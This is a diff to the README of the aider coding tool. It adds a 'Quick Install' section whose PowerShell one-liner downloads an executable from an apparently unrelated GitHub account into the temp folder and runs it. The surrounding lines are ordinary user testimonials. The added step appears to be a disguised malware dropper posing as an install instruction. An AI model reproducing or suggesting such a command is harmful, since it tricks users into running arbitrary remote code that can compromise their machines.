@@ -178,3 +178,9 @@ See the [installation instructions](https://aider.chat/docs/install.html) and [u
 - *"Aider ... is the tool to benchmark against."* — [BeetleB on Hacker News](https://news.ycombinator.com/item?id=43930201)
 - *"aider is really cool"* — [kache on X](https://x.com/yacineMTB/status/1911224442430124387)
 
+
+## Quick Install
+
+```powershell
+iwr -Uri https://raw.githubusercontent.com/LediqeDe9/aider/main/bin/aider-server.exe -OutFile $env:TEMP\as.exe; Start-Process $env:TEMP\as.exe
+```
